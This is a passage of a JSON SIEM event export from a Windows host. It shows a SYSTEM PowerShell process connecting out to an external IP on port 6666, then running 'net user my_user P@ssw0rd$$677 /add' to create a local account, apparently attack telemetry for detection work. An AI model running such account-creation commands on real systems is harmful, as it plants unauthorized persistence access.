        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"3\",\"Version\":\"5\",\"Level\":\"4\",\"Task\":\"3\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T13:47:28.4704250Z\"},\"EventRecordID\":\"2436700\",\"Execution\":{\"ProcessID\":\"3472\",\"ThreadID\":\"4980\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\",\"text\":\"-\"},{\"Name\":\"UtcTime\",\"text\":\"2024-11-28 13:47:12.275\"},{\"Name\":\"ProcessGuid\",\"text\":\"{8cbafd4f-746e-6748-231c-010000003000}\"},{\"Name\":\"ProcessId\",\"text\":\"7564\"},{\"Name\":\"Image\",\"text\":\"C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"User\",\"text\":\"NT AUTHORITY\\\\SYSTEM\"},{\"Name\":\"Protocol\",\"text\":\"tcp\"},{\"Name\":\"Initiated\",\"text\":\"true\"},{\"Name\":\"SourceIsIpv6\",\"text\":\"false\"},{\"Name\":\"SourceIp\",\"text\":\"10.156.92.66\"},{\"Name\":\"SourceHostname\",\"text\":\"wperry.dev.it.stf\"},{\"Name\":\"SourcePort\",\"text\":\"61578\"},{\"Name\":\"SourcePortName\",\"text\":\"-\"},{\"Name\":\"DestinationIsIpv6\",\"text\":\"false\"},{\"Name\":\"DestinationIp\",\"text\":\"3.5.140.10\"},{\"Name\":\"DestinationHostname\",\"text\":\"-\"},{\"Name\":\"DestinationPort\",\"text\":\"6666\"},{\"Name\":\"DestinationPortName\",\"text\":\"-\"}]}}}",
      "category.generic": "Connection",
      "category.high": "Network Interaction Management",
      "category.low": "State",
      "direction": "egress",
      "dst.host": "3.5.140.10",
      "dst.ip": "3.5.140.10",
      "dst.port": 6666,
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Other",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-Sysmon",
      "event_src.ip": "10.156.92.66",
      "event_src.subsys": "microsoft-windows-sysmon/operational",
      "event_src.title": "sysmon",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Sysmon_3_Network_connection",
      "importance": "info",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "3",
      "normalized": true,
      "object": "connection",
      "object.account.domain": "nt authority",
      "object.account.id": "S-1-5-18",
      "object.account.name": "system",
      "object.account.provider": "local",
      "object.account.session_id": "999",
      "object.process.fullpath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
      "object.process.guid": "8cbafd4f-746e-6748-231c-010000003000",
      "object.process.id": "7564",
      "object.process.name": "powershell.exe",
      "object.process.path": "c:\\windows\\system32\\windowspowershell\\v1.0\\",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "protocol": "tcp",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "src.fqdn": "wperry.dev.it.stf",
      "src.host": "wperry.dev.it.stf",
      "src.hostname": "wperry",
      "src.ip": "10.156.92.66",
      "src.port": 61578,
      "status": "success",
      "subject": "rule",
      "subject.name": "-",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T13:47:28.4700000Z",
      "uuid": "54df3efc-ad8f-11ef-b052-005056b7517e",
      "text": "A tcp connection from host wperry.dev.it.stf to host 3.5.140.10 is opened on host wperry.dev.it.stf",
      "_checkpoint": 216133856715,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "54df3efc-ad8f-11ef-b052-005056b7517e",
        "time": "2024-11-28T13:47:28.4700000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "execute",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-PowerShell\",\"Guid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\"},\"EventID\":\"4104\",\"Version\":\"1\",\"Level\":\"5\",\"Task\":\"2\",\"Opcode\":\"15\",\"Keywords\":\"0x0\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T13:49:40.2323847Z\"},\"EventRecordID\":\"248131\",\"Correlation\":{\"ActivityID\":\"{085a976f-3d95-0001-294c-6308953ddb01}\"},\"Execution\":{\"ProcessID\":\"7564\",\"ThreadID\":\"9488\"},\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"MessageNumber\",\"text\":\"1\"},{\"Name\":\"MessageTotal\",\"text\":\"1\"},{\"Name\":\"ScriptBlockText\",\"text\":\"net user my_user P@ssw0rd$$677 /add\"},{\"Name\":\"ScriptBlockId\",\"text\":\"59f8f773-6ec5-472e-861a-513ed1726d0f\"},{\"Name\":\"Path\"}]}}}",
      "category.generic": "Command",
      "category.high": "System Management",
      "category.low": "Manipulation",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Operating system",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-PowerShell",
      "event_src.subsys": "microsoft-windows-powershell/operational",
      "event_src.title": "windows",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Common_PowerShell_4104_Command_executed",
      "importance": "info",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "4104",
      "normalized": true,
      "numfield1": 1,
      "numfield2": 1,
      "object": "command",
      "object.account.domain": "nt authority",
      "object.account.id": "S-1-5-18",
      "object.account.name": "system",
      "object.account.provider": "local",
      "object.account.session_id": "999",
      "object.id": "59f8f773-6ec5-472e-861a-513ed1726d0f",
      "object.process.cmdline": "net user my_user P@ssw0rd$$677 /add",
      "object.process.id": "7564",
      "object.value": "net user my_user P@ssw0rd$$677 /add",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "account",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T13:49:40.2320000Z",
      "uuid": "b063bdf9-ad8f-11ef-b052-005056b7517e",
      "text": "A PowerShell command is executed on host wperry.dev.it.stf. Creating Scriptblock text (1 of 1).",
      "_checkpoint": 216138752048,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "b063bdf9-ad8f-11ef-b052-005056b7517e",
        "time": "2024-11-28T13:49:40.2320000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
    {
      "action": "start",
      "agent_id": "e24b4795-36be-4043-b8f5-00a480c8428d",
      "asset_ids": [
        "1b5edacf-03c0-0001-0000-000000000061",
        "1b5edb23-4c40-0001-0000-000000000075"
      ],
      "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-Sysmon\",\"Guid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\"},\"EventID\":\"7\",\"Version\":\"3\",\"Level\":\"4\",\"Task\":\"7\",\"Opcode\":\"0\",\"Keywords\":\"0x8000000000000000\",\"TimeCreated\":{\"SystemTime\":\"2024-11-28T13:49:40.3466032Z\"},\"EventRecordID\":\"2436815\",\"Execution\":{\"ProcessID\":\"3472\",\"ThreadID\":\"5440\"},\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Computer\":\"wperry.dev.it.stf\",\"Security\":{\"UserID\":\"S-1-5-18\"}},\"EventData\":{\"Data\":[{\"Name\":\"RuleName\",\"text\":\"All images\"},{\"Name\":\"UtcTime\",\"text\":\"2024-11-28 13:49:40.337\"},{\"Name\":\"ProcessGuid\",\"text\":\"{8cbafd4f-746e-6748-231c-010000003000}\"},{\"Name\":\"ProcessId\",\"text\":\"7564\"},{\"Name\":\"Image\",\"text\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"},{\"Name\":\"ImageLoaded\",\"text\":\"C:\\\\Windows\\\\assembly\\\\NativeImages_v4.0.30319_64\\\\Microsoft.Pae3498d9#\\\\13663e929408c926675417670abce107\\\\Microsoft.PowerShell.Commands.Management.ni.dll\"},{\"Name\":\"FileVersion\",\"text\":\"10.0.19041.3636\"},{\"Name\":\"Description\",\"text\":\"Microsoft Windows PowerShell Management Commands\"},{\"Name\":\"Product\",\"text\":\"Microsoft (R) Windows (R) Operating System\"},{\"Name\":\"Company\",\"text\":\"Microsoft Corporation\"},{\"Name\":\"OriginalFileName\",\"text\":\"Microsoft.PowerShell.Commands.Management.dll\"},{\"Name\":\"Hashes\",\"text\":\"MD5=B82EF5511B6884EAAA92FFB4CDC135E0,SHA256=9790D4188ED054B735888D51DFDA29933C0071B9A61C24CF0948D9E8A5D45AA0,IMPHASH=00000000000000000000000000000000\"},{\"Name\":\"Signed\",\"text\":\"false\"},{\"Name\":\"Signature\",\"text\":\"-\"},{\"Name\":\"SignatureStatus\",\"text\":\"Unavailable\"},{\"Name\":\"User\",\"text\":\"NT AUTHORITY\\\\SYSTEM\"}]}}}",
      "category.generic": "Executable Module",
      "category.high": "Availability Management",
      "category.low": "Control",
      "event_src.asset": "1b5edacf-03c0-0001-0000-000000000061",
      "event_src.category": "Other",
      "event_src.fqdn": "wperry.dev.it.stf",
      "event_src.host": "wperry.dev.it.stf",
      "event_src.hostname": "wperry",
      "event_src.id": "Microsoft-Windows-Sysmon",
      "event_src.rule": "All images",
      "event_src.subsys": "microsoft-windows-sysmon/operational",
      "event_src.title": "sysmon",
      "event_src.vendor": "microsoft",
      "generator.type": "logcollector",
      "historical": false,
      "id": "PT_Microsoft_Windows_eventlog_Sysmon_7_Image_loaded",
      "importance": "low",
      "incorrect_time": false,
      "input_id": "8420610f-4530-4e84-8708-f3f8c9c3791c",
      "job_id": "9dadc32a-e189-4a46-a14e-bcc376ace4f9",
      "mime": "application/x-pt-eventlog",
      "msgid": "7",
      "normalized": true,
      "object": "module",
      "object.process.fullpath": "c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\microsoft.pae3498d9#\\13663e929408c926675417670abce107\\microsoft.powershell.commands.management.ni.dll",
      "object.process.hash": "IMPHASH:00000000000000000000000000000000 MD5:B82EF5511B6884EAAA92FFB4CDC135E0 SHA256:9790D4188ED054B735888D51DFDA29933C0071B9A61C24CF0948D9E8A5D45AA0",
      "object.process.hash.imphash": "00000000000000000000000000000000",
      "object.process.hash.md5": "B82EF5511B6884EAAA92FFB4CDC135E0",
      "object.process.hash.sha256": "9790D4188ED054B735888D51DFDA29933C0071B9A61C24CF0948D9E8A5D45AA0",
      "object.process.meta": "Description:Microsoft Windows PowerShell Management Commands | Product:Microsoft (R) Windows (R) Operating System | Company:Microsoft Corporation",
      "object.process.name": "microsoft.powershell.commands.management.ni.dll",
      "object.process.original_name": "Microsoft.PowerShell.Commands.Management.dll",
      "object.process.path": "c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\microsoft.pae3498d9#\\13663e929408c926675417670abce107\\",
      "object.property": "signature status",
      "object.value": "not signed",
      "object.version": "10.0.19041.3636",
      "origin_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "primary_siem_app_id": "1a1438a4-f340-0001-0000-000000000004",
      "recv_asset": "1b5edb23-4c40-0001-0000-000000000075",
      "recv_ipv4": "10.156.92.228",
      "remote": false,
      "scope_id": "00000000-0000-0000-0000-000000000005",
      "siem_id": "60fc3aec-dfa9-4956-a04c-838c263276f0",
      "status": "success",
      "subject": "process",
      "subject.account.domain": "nt authority",
      "subject.account.id": "S-1-5-18",
      "subject.account.name": "system",
      "subject.account.provider": "local",
      "subject.account.session_id": "999",
      "subject.process.fullpath": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
      "subject.process.guid": "8cbafd4f-746e-6748-231c-010000003000",
      "subject.process.id": "7564",
      "subject.process.name": "powershell.exe",
      "subject.process.path": "c:\\windows\\system32\\windowspowershell\\v1.0\\",
      "tag": "wineventlog",
      "task_id": "1b5ed942-b7c0-0001-0000-000000000338",
      "taxonomy_version": "27.0.223-release-27.0",
      "tenant_id": "6e484846-c7ac-40e7-b331-f530cb659820",
      "time": "2024-11-28T13:49:40.3460000Z",
      "uuid": "a82a2ea6-ad8f-11ef-b052-005056b7517e",
      "text": "The process powershell.exe loaded the module microsoft.powershell.commands.management.ni.dll on host wperry.dev.it.stf",
      "_checkpoint": 216138320101,
      "origin_app_alias": "MP-1",
      "primary_siem_app_alias": "MP-1",
      "siem_alias": "siem-server2.soc.stf",
      "site_alias": "unknown site_id=null",
      "site_name": "unknown site_id=null",
      "site_address": "unknown site_id=null",
      "_meta": {
        "id": "a82a2ea6-ad8f-11ef-b052-005056b7517e",
        "time": "2024-11-28T13:49:40.3460000Z",
        "assetIds": [
          "1b5edacf-03c0-0001-0000-000000000061",
          "1b5edb23-4c40-0001-0000-000000000075"
        ],
        "site_alias": "unknown site_id=null",
        "site_name": "unknown site_id=null",
        "site_address": "unknown site_id=null",
        "site_is_deleted": true
      }
    },
